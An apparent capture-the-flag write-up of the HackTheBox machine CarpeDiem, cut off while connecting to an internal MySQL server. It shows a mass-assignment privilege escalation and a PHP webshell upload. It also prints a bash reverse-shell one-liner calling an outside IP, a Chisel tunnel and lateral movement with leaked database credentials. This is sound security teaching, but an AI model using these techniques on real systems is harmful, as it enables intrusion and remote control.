---
title: HTB: CarpeDiem
url: https://0xdf.gitlab.io/2022/12/03/htb-carpediem.html
date: 2022-12-03T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, htb-carpediem, ctf, nmap, feroxbuster, wfuzz, vhosts, php, trudesk, html-file, upload, burp, burp-repeater, webshell, docker, container, pivot, chisel, mongo, mongoexport, bcrypt, python, api, source-code, voip, zoiper, voicemail, backdrop-cms, wireshark, tcpdump, tls-decryption, weak-tls, backdrop-plugin, docker-escape, cgroups, cve-2022-0492, htb-ready
---

![CarpeDiem](https://0xdfimages.gitlab.io/img/carpediem-cover.png)

CarpeDiem is a hard linux box that involves pivoting through a small network of Docker containers. I’ll start by getting admin access to a website, and using an upload feature to get a webshell and a foothold in that container. From there, I’ll enumerate the network and find an instance of trudesk, from which I’ll read a ticket about a new employee who will get their creds via their voicemail. I’ll follow the instructions in the ticket to get access to the voicemail, and their SSH password. I’ll pivot back into a Backdrop CMS instance by getting creds and uploading a malicious plugin. From there, I’ll get root in that container, and then abuse CVE-2022-0492 to get root on the host.

## Box Info

| Name | [CarpeDiem](https://hackthebox.com/machines/carpediem)  [CarpeDiem](https://hackthebox.com/machines/carpediem) [Play on HackTheBox](https://hackthebox.com/machines/carpediem) |
| --- | --- |
| Release Date | [25 Jun 2022](https://twitter.com/hackthebox_eu/status/1539624282686464005) |
| Retire Date | 03 Dec 2022 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for CarpeDiem |
| Radar Graph | Radar chart for CarpeDiem |
| First Blood User | 01:23:15[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 02:20:39[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creators | [ctrlzero ctrlzero](https://app.hackthebox.com/users/168546)  [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.167
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-28 13:59 UTC
Nmap scan report for 10.10.11.167
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.167
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-28 14:49 UTC
Nmap scan report for 10.10.11.167
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Comming Soon
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.93 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu focal 20.04.

### Website - TCP 80

#### Site

The site doesn’t offer much information, except for a way too long timer for a “coming soon” countdown:

![image-20221128095307835](https://0xdfimages.gitlab.io/img/image-20221128095307835.png)

It does give a domain name, which I’ll add to `/etc/hosts` on my VM.

The “Subscribe” button doesn’t even submit the data entered into “Your email address”, but rather just loads `/?`.

#### Tech Stack

The HTTP headers don’t show much beyond NGINX (matching `nmap`):

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Nov 2022 14:51:36 GMT
Content-Type: text/html
Last-Modified: Thu, 07 Apr 2022 22:54:58 GMT
Connection: close
ETag: W/"624f6bc2-b3b"
Content-Length: 2875

```

A quick look at the HTML source shows just a bootstrap template. Nothing else too interesting.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and it finds nothing interesting:

```

oxdf@hacky$ feroxbuster -u http://carpediem.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://carpediem.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       58l      161w     2875c http://carpediem.htb/
301      GET        7l       12w      178c http://carpediem.htb/scripts => http://carpediem.htb/scripts/
301      GET        7l       12w      178c http://carpediem.htb/img => http://carpediem.htb/img/
301      GET        7l       12w      178c http://carpediem.htb/styles => http://carpediem.htb/styles/
[####################] - 54s   150000/150000  0s      found:4       errors:0
[####################] - 53s    30000/30000   565/s   http://carpediem.htb
[####################] - 53s    30000/30000   564/s   http://carpediem.htb/
[####################] - 52s    30000/30000   566/s   http://carpediem.htb/scripts
[####################] - 53s    30000/30000   565/s   http://carpediem.htb/img
[####################] - 53s    30000/30000   565/s   http://carpediem.htb/styles

```

### Subdomain Fuzz

Given the use of the domain name `carpediem.htb`, I’ll look for any other subdomains that might return a different page. I’ll use `wfuzz` to fuzz the host header, and filter the default page that’s length 2875 bytes:

```

oxdf@hacky$ wfuzz -u http://carpediem.htb -H "Host: FUZZ.carpediem.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 2875
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://carpediem.htb/
Total requests: 4989

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000048:   200        462 L    2174 W   31090 Ch    "portal"

Total time: 44.55443
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 111.9753

```

### portal.carpediem.htb - TCP 80

#### Site

This site is about motorcycles:

[![image-20221128101358041](https://0xdfimages.gitlab.io/img/image-20221128101358041.png)](https://0xdfimages.gitlab.io/img/image-20221128101358041.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20221128101358041.png)

The “About” link just gives some lorem ipsum text. “Categories” and “Brand” each provide drop downs which can filter:

![image-20221128101610698](https://0xdfimages.gitlab.io/img/image-20221128101610698.png)

#### With Account

Clicking “Login” offers a form popup:

![image-20221128102022418](https://0xdfimages.gitlab.io/img/image-20221128102022418.png)

The “Create Account” link offers a registration form:

![image-20221128102231718](https://0xdfimages.gitlab.io/img/image-20221128102231718.png)

On filling it out, “Login” is replaced with “Hi, 0xdf!” and a logout icon:

![image-20221128102156000](https://0xdfimages.gitlab.io/img/image-20221128102156000.png)

Everything else is the same, except there’s a page about my account linked from the “Hi, 0xdf!”:

![image-20221128102804693](https://0xdfimages.gitlab.io/img/image-20221128102804693.png)

“Manage Account” leads to a page to change things:

![image-20221128102831102](https://0xdfimages.gitlab.io/img/image-20221128102831102.png)

Each motorcycle when viewed has a “Book this Bike” button. If not logged in, it pops the login form. Otherwise, it pops a form to reserve a bike:

![image-20221128103104846](https://0xdfimages.gitlab.io/img/image-20221128103104846.png)

On submitting, it shows:

![image-20221128103123625](https://0xdfimages.gitlab.io/img/image-20221128103123625.png)

Any booking now show up in the “My Bookings” page:

![image-20221128103149010](https://0xdfimages.gitlab.io/img/image-20221128103149010.png)

#### Tech Stack

The HTTP headers for this subdomain show the site is running PHP:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Nov 2022 15:13:32 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 31090
Connection: close
X-Powered-By: PHP/7.4.25
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding

```

I can confirm this by showing that `/index.php` loads the same page, where `index.html` or other paths do not.

The URL structure is interesting as well. Every page other than the “Home” page sets a `?p=[name]` variable. For example, “About” is `p=about` . Viewing “All Categories” is `p=view_categories`. Filtering on Honda bikes goes to `p=bikes&s=c81e728d9d4c2f636f067f89cc14862c`, where the `s` is the id for Honda. The category filter is similar, but the `c` variable is used.

At this point I can see a PHP page that is either including pages based on `p`, or branching based on it. I’ll try to set `p` to `index` to see what happens. It crashes:

![image-20221128103342869](https://0xdfimages.gitlab.io/img/image-20221128103342869.png)

That is the page trying to include `index.php`, which then tries to include `index.php`, repeating until it runs out of memory. It also leads the full path to the web directory on disk.

#### Directory Brute Force

`feroxbuster` with `-x php` returns a ton of stuff (most snipped out here for readability):

```

oxdf@hacky$ feroxbuster -u http://portal.carpediem.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://portal.carpediem.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      330c http://portal.carpediem.htb/plugins => http://portal.carpediem.htb/plugins/
301      GET        9l       28w      328c http://portal.carpediem.htb/admin => http://portal.carpediem.htb/admin/
200      GET       75l      135w     2963c http://portal.carpediem.htb/login.php
200      GET      462l     2174w        0c http://portal.carpediem.htb/
302      GET        0l        0w        0c http://portal.carpediem.htb/logout.php => ./
301      GET        9l       28w      326c http://portal.carpediem.htb/inc => http://portal.carpediem.htb/inc/
301      GET        9l       28w      330c http://portal.carpediem.htb/uploads => http://portal.carpediem.htb/uploads/
301      GET        9l       28w      329c http://portal.carpediem.htb/assets => http://portal.carpediem.htb/assets/
...[snip]...

```

The most interesting find is `/admin`. Trying to visit this returns a popup:

![image-20221128112300239](https://0xdfimages.gitlab.io/img/image-20221128112300239.png)

## Shell as www-data in Portal Container

### Fails

#### Failed Source Read

Based on the analysis above, I already feel pretty confident that the `index.php` page is calling something like `include $_GET['p'] . '.php'`. Because it’s appending the extension, I can’t try to read files that aren’t PHP.

I can try to read the source for files using PHP filters to base64 encode it. Unfortunately, this fails:

![image-20221128104547905](https://0xdfimages.gitlab.io/img/image-20221128104547905.png)

My best guess is that it’s filtering somehow to not allow the filter. I’ll show what’s happening in [Beyond Root](#php-filter-fail).

#### Failed XSS

The message when I reverse a bike includes the phrase “The management will contact you as soon they sees your request for confirmation”. This suggests that the management will be looking at my submission, which suggests perhaps an cross site scripting exploit.

Looking at what happens when I submit a request, it actually makes two POST requests to `/classes/Master.php`:

![image-20221128111216046](https://0xdfimages.gitlab.io/img/image-20221128111216046.png)

The first includes the information about the reservation:

```

POST /classes/Master.php?f=rent_avail HTTP/1.1
Host: portal.carpediem.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 49
Origin: http://portal.carpediem.htb
Connection: close
Referer: http://portal.carpediem.htb/?p=view_bike&id=37693cfc748049e45d87b8c7d8b9aacd
Cookie: PHPSESSID=3f3b1c31ece180ebe219b6053acf79e9
Pragma: no-cache
Cache-Control: no-cache

ds=2022-11-29&de=2022-12-07&bike_id=23&max_unit=3

```

The second sends that same data as form data:

```

POST /classes/Master.php?f=save_booking HTTP/1.1
Host: portal.carpediem.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------12614741991968432430841744607
Content-Length: 654
Origin: http://portal.carpediem.htb
Connection: close
Referer: http://portal.carpediem.htb/?p=view_bike&id=37693cfc748049e45d87b8c7d8b9aacd
Cookie: PHPSESSID=3f3b1c31ece180ebe219b6053acf79e9
Pragma: no-cache
Cache-Control: no-cache
-----------------------------12614741991968432430841744607
Content-Disposition: form-data; name="bike_id"

23
-----------------------------12614741991968432430841744607
Content-Disposition: form-data; name="date_start"

2022-11-29
-----------------------------12614741991968432430841744607
Content-Disposition: form-data; name="date_end"

2022-12-07
-----------------------------12614741991968432430841744607
Content-Disposition: form-data; name="rent_days"

9
-----------------------------12614741991968432430841744607
Content-Disposition: form-data; name="amount"

9000
-----------------------------12614741991968432430841744607--

```

It’s possible that the second POST requires information from the first, but it doesn’t seem so. The latter POST is likely the one that’s saving the data (likely to the database), so I’ll try putting XSS payloads in there. The numbers likely aren’t good targets, but I can see if the dates are treated as strings. For example:

![image-20221128111522945](https://0xdfimages.gitlab.io/img/image-20221128111522945.png)

Submitting this returns `{"status":"success"}`, but there’s never a request at my Python webserver. I’ll try some more as well, messing with both requests, but nothing ever reaches back out.

### Admin Access

#### Enumeration

Poking around a bit more, I’ll look at the requests that interact with accounts. The POST to create an account goes to `/classes/Master.php?f=register`. There’s nothing too interesting in the POST body, just what’s in the form.

The POST to modify my account is more interesting:

```

POST /classes/Master.php?f=update_account HTTP/1.1
Host: portal.carpediem.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 125
Origin: http://portal.carpediem.htb
Connection: close
Referer: http://portal.carpediem.htb/?p=edit_account
Cookie: PHPSESSID=3f3b1c31ece180ebe219b6053acf79e9

id=25&login_type=2&firstname=0xdf&lastname=0xdf&contact=0xdf%40carpediem.htb&gender=Male&address=0xdf&username=0xdf&password=

```

It includes all the visible fields on the form, as well as `id` and `login_type`. These come from `hidden` fields, which can be seen in the HTML source:

![image-20221128121005261](https://0xdfimages.gitlab.io/img/image-20221128121005261.png)

#### Update login\_type

`id` is likely my user’s ID in the database. It makes sense that the site needs that, though it could presumably get it from the cookie.

I’ll send that POST request to Burp Repeater and mess with it.

Changing the `id` responds with `{"status":"failed","msg":"Username or ID already exists."}`. That message doesn’t really make sense, but it seems I can’t mess with other user’s info (I’ll show why in [Beyond Root](#updating-other-users)).

I’ll next try changing the `login_type` from 2 to something else. On setting it to 0, it returns success:

[![image-20221128122700461](https://0xdfimages.gitlab.io/img/image-20221128122700461.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221128122700461.png)

Browsing around the site doesn’t look any different, and `/admin` still returns “Access Denied!”.

However, on changing my user’s `login_type` to 1, `/admin` loads!

### /admin Enumeration

#### Overview

The admin panel has a Dashboard and a series of other pages:

![image-20221128125127911](https://0xdfimages.gitlab.io/img/image-20221128125127911.png)

The “Bike List” page looks like a GUI over the table in the DB with bikes:

![image-20221128125250468](https://0xdfimages.gitlab.io/img/image-20221128125250468.png)

If I actually try to edit anything, it throws an error.

The “Booking List” section shows a bunch of bookings, including mine, but not the ones where I tried XSS:

![image-20221128125415479](https://0xdfimages.gitlab.io/img/image-20221128125415479.png)

The “Booking Report” page is just the same data with some filters.

“Brand List” and “Category List” are very similar to “Bike List”. “Settings” has values for things like the title, the “About Us” text, cover images, etc. There’s no save button on this one.

#### Submit Trudesk Ticket

“Submit Trudesk Ticket” sounds interesting, but it is actually a dead form:

![image-20221128125830538](https://0xdfimages.gitlab.io/img/image-20221128125830538.png)

At the top, it says:

> ##### NOTE: Trudesk integration not yet implemented. Please submit any requests to Trudesk directly.

Looking at the raw HTML, there is a form there:

![image-20221128130006795](https://0xdfimages.gitlab.io/img/image-20221128130006795.png)

The blank `action` means it will submit to the current URL, which is `/admin/?page=maintenance/helpdesk`. I can recreate this form submission manually, but anything I submit doesn’t seem to show anything different from this page. There could be something going on in the backend, but I don’t have enough to really do anything yet.

#### Querterly Report Upload

This page says the upload functions are still in development:

![image-20221128130534349](https://0xdfimages.gitlab.io/img/image-20221128130534349.png)

The “Action” menu offers a a few options, though “View” and “Edit” don’t seem to do much:

![image-20221128130614203](https://0xdfimages.gitlab.io/img/image-20221128130614203.png)

Both “Add” and “Delete” show a warning:

![image-20221128130641393](https://0xdfimages.gitlab.io/img/image-20221128130641393.png)

For each, clicking “Continue” shows a failure message:

![image-20221128130708314](https://0xdfimages.gitlab.io/img/image-20221128130708314.png)

The “Delete” selection issues a POST to `/classes/User.php?f=delete_file`, and it returns 200 OK with no body, so I’m not sure what they error is.

The “Add” sends a POST to `/classes/User.php?f=upload`, and the return is also 200 OK. But this one has a body:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Nov 2022 18:54:37 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.25
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 40

{"error":"multipart\/form-data missing"}

```

### Webshell Upload

#### Form Data Background

I’ll send the upload request to Burp Repeater and start to build it out. Form data is defined in [IETF RFC-7578](https://www.rfc-editor.org/rfc/rfc7578), but [this StackOverflow response](https://stackoverflow.com/a/8660740) does a nice job of giving a short example, which I’ve marked up a bit here:

![image-20221128142139656](https://0xdfimages.gitlab.io/img/image-20221128142139656.png)

In red, the `Content-Type` header will be `multipart/form-data`, and then it defines the `boundary`, which is used to separate the various parameters. In a standard POST, that would be a `&`, but for a form, it allows for each item to have both metadata and data, so each parameter is separated by this string. Each boundary string in use is prefixed by an additional `--`, and the last one has `--` added to the end.

The first parameter in this example (blue label) is just a form value. The first line is the metadata, `;`-separated, starting with a `Content-Disposition: form-data`, and then a series of key values pairs. The `MAX_FILE_SIZE` one here just has a `name`, which is used to reference that item by the server.

The second item has metadata typical of a file upload, including `filename` and a `Content-Type` header.

I’ll also try asking [ChatGPT](https://chat.openai.com/chat) about this, and it gives a nice answer as well:

![image-20221202114350281](https://0xdfimages.gitlab.io/img/image-20221202114350281.png)

#### Build Upload Request

I’ll send the request to `/classes/Users.php` over to Repeater, and add in the `Content-Type` header and the file item from the example. I’ll update the `boundary` just to show it can be anything, and change the metadata about the file a bit:

[![image-20221128142916317](https://0xdfimages.gitlab.io/img/image-20221128142916317.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221128142916317.png)

It responds with an error saying that `file_upload` is missing. That’s almost certainly referring to the `name` of the item, which is `uploadedfile` from that example. I’ll update it, and it works, returning a path:

[![image-20221128143019136](https://0xdfimages.gitlab.io/img/image-20221128143019136.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221128143019136.png)

That file is on the server:

![image-20221128143050001](https://0xdfimages.gitlab.io/img/image-20221128143050001.png)

This part could be frustrating to people, as in order to get a different error message, I need to have a form object with `filename=something`. That’s the standard form data created by a `<input type="file">` HTML tag. The `name=file_upload` is custom to the application here, which is why an error message is necessary to leak that bit of information.

#### Upload Webshell

I’ll update that request to hold a PHP webshell. It also seems to keep the `filename`, appending a number to the front of the name, so I’ll change that to end with `.php`:

[![image-20221128143303095](https://0xdfimages.gitlab.io/img/image-20221128143303095.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221128143303095.png)

It works:

![image-20221128143246146](https://0xdfimages.gitlab.io/img/image-20221128143246146.png)

### Shell

I’ll put a simple [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) in as the command and submit it:

```

oxdf@hacky$ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"' http://portal.carpediem.htb/uploads/1669663920_0xdf.php

```

At a listening `nc`, there’s a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.167 46920
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@3c371615b7aa:/var/www/html/portal/uploads$ 

```

I’ll upgrade the shell with the `script` / `stty` [trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@3c371615b7aa:/var/www/html/portal/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@3c371615b7aa:/var/www/html/portal/uploads$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@3c371615b7aa:/var/www/html/portal/uploads$ 

```

## Shell as hflaccus on CarpeDiem

### Host Enumeration

#### Docker

There’s not much on this host, and it’s clearly a Docker container:
- The hostname is random string and not CarpeDiem.
- There’s a `.dockerenv` file in the system root.
- Common commands like `ifconfig` and `ip` are missing.

#### General

The IP address can be found in `/proc/net/fib_trie` to be 172.17.0.6 (though it’s possible that the last octet will change on a reboot / reset of the box).

There are no user home directories in `/home`.

In `/var/www/html` there is a `portal` directory that has the application code for this web server. The `carpediem.htb` “Coming soon” site doesn’t seem to be present on this container.

#### Portal Site

Looking at the source for `portal.carpediem.htb`, in the root directory there’s a `config.php`:

```

www-data@3c371615b7aa:/var/www/html/portal$ ls
404.html          build             index.php       privacy_policy.html
about.html        classes           initialize.php  registration.php
about.php         config.php        libs            success_booking.php
admin             dist              login.php       uploads
assets            edit_account.php  logout.php      view_bike.php
bikes.php         home.php          my_account.php  view_categories.php
book_to_rent.php  inc               plugins  

```

There aren’t any passwords in it, but it does have these lines at the top:

```

require_once('initialize.php');
require_once('classes/DBConnection.php');

```

`initialize.php` has information about a user named dev\_oretnom, as well as some DB connection info:

```

<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','http://portal.carpediem.htb/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"mysql");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"portaldb");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"J5tnqsXpyzkK4XNt");
if(!defined('DB_NAME')) define('DB_NAME',"portal");
?>

```

The value inserted as the `password` looks like an MD5 hash, but it doesn’t crack.

`DBConnection.php` has those same creds:

```

<?php
if(!defined('DB_SERVER')){
    require_once("../initialize.php");
}
class DBConnection{

    private $host = 'mysql';
    private $username = 'portaldb';
    private $password = 'J5tnqsXpyzkK4XNt';
    private $database = 'portal';
    
    public $conn;
    
    public function __construct(){

        if (!isset($this->conn)) {
            
            $this->conn = new mysqli($this->host, $this->username, $this->password, $this->database);
            
            if (!$this->conn) {
                echo 'Cannot connect to database server';
                exit;
            }            
        }    
        
    }
    public function __destruct(){
        $this->conn->close();
    }
}
?>

```

### Network Enumeration

#### Ping Sweep

This ping sweep one-liner will return all the hosts in the same class-C in less than one second:

```

www-data@3c371615b7aa:/$ time for i in {1..254}; do (ping -c 1 172.17.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.17.0.1: icmp_seq=0 ttl=64 time=0.068 ms
64 bytes from 172.17.0.2: icmp_seq=0 ttl=64 time=0.045 ms
64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.128 ms
64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.038 ms
64 bytes from 172.17.0.6: icmp_seq=0 ttl=64 time=0.016 ms
64 bytes from 172.17.0.5: icmp_seq=0 ttl=64 time=0.029 ms

real    0m0.477s
user    0m0.117s
sys     0m0.056s

```

Six hosts. I’ll assume that .1 is the host running the containers, and I know from the host enumeration that this container is .6. The DB server was set to `mysql`, which is likely a hostname. I’ll `ping` it, and get its IP as 172.17.0.3:

```

www-data@3c371615b7aa:/$ ping -c 1 mysql
PING mysql (172.17.0.3): 56 data bytes
64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.084 ms
--- mysql ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.084/0.084/0.084/0.000 ms

```

#### nmap

I’ll download a statically compiled `nmap` from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and upload it to the container using a Python webserver and `wget`. In 21 seconds, it scans all the ports on all six hosts:

```

www-data@3c371615b7aa:/tmp$ ./nmap -p- --min-rate 10000 172.17.0.1-6

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-11-28 20:48 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.000090s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 172.17.0.2
Host is up (0.00047s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
443/tcp open  https

Nmap scan report for mysql (172.17.0.3)
Host is up (0.00034s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
3306/tcp  open  mysql
33060/tcp open  unknown

Nmap scan report for 172.17.0.4
Host is up (0.00034s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE
27017/tcp open  unknown

Nmap scan report for 172.17.0.5
Host is up (0.00012s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
8118/tcp open  unknown

Nmap scan report for 3c371615b7aa (172.17.0.6)
Host is up (0.00012s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 6 IP addresses (6 hosts up) scanned in 21.00 seconds

```

#### Tunnel with Chisel

At this point it’s worth uploading [Chisel](https://github.com/jpillora/chisel) to get a proxy into this network (though it’s possible to complete CarpeDiem without this). I’ll host it with Python, and the upload it with `wget`. Then I’ll start the server on my VM:

```

oxdf@hacky$ ./chisel_1.7.7_linux_amd64 server -p 8000 --reverse
2022/11/28 21:04:03 server: Reverse tunnelling enabled
2022/11/28 21:04:03 server: Fingerprint QgJndP8XXAYGo7Jf2+vSTSFH4iAa+tNYtrbWrm82J4k=
2022/11/28 21:04:03 server: Listening on http://0.0.0.0:8000

```

And I’ll connect from the container:

```

www-data@3c371615b7aa:/tmp$ ./chisel_1.7.7_linux_amd64 client 10.10.14.6:8000 R:socks 
2022/11/28 21:05:25 client: Connecting to ws://10.10.14.6:8000
2022/11/28 21:05:25 client: Connected (Latency 86.893335ms)

```

I’ll configure both `proxychains` and FoxyProxy to use this socks proxy, and now I can interact with hosts on this subnet. For example, the .1 is showing the “Coming Soon” site:

![image-20221128160801212](https://0xdfimages.gitlab.io/img/image-20221128160801212.png)

#### 172.17.0.1 - host

Typically in Docker the .1 is the host. The fact that it matches what I see on the given IP for CarpeDiem is a good sign that’s the case as well.

#### 172.17.0.2 - backdrop

`nmap` showed this host as listening on HTTP (80), HTTPS (443), and FTP (21). The HTTP site just redirects to HTTPS. This is an instance of [Backdrop CMS](https://backdropcms.org/):

![image-20221128161111930](https://0xdfimages.gitlab.io/img/image-20221128161111930.png)

It shows the hostname of `backdrop.carpediem.htb`. I’ll add that to my `hosts` file, but I can’t reach it from my VM directly. I don’t have login information (the creds from above don’t work), and I can’t find any unauthenticated exploits for Backdrop CMS.

There is an FTP server on the host, and it does allow anonymous login:

```

oxdf@hacky$ proxychains ftp 172.17.0.2
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:21  ...  OK
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:oxdf): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

```

By default, FTP will try to open another connection back to my host, but this won’t work over the tunnel. I’ll set the connection to passive mode to avoid this:

```

ftp> passive
Passive mode on.

```

Even still, trying to get a directory listing just hangs:

```

ftp> dir
227 Entering Passive Mode (172,17,0,2,130,94).
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:33374  ...  OK
150 Here comes the directory listing.

```

It’s not clear what’s going on, but I’ll come back to it if I’m stuck.

#### 172.17.0.3 - mysql

This host was open on 3306 and 33060. These are likely both MySQL instances.

I’ll connect to the first using the creds from portal:

```

oxdf@hacky$ proxychains mysql -h 172.17.0.3 -u portaldb -pJ5tnqsXpyzkK4XNt 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
mysql: [Warning] Using a password on the command line interface can be insecure.
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:3306  ...  OK
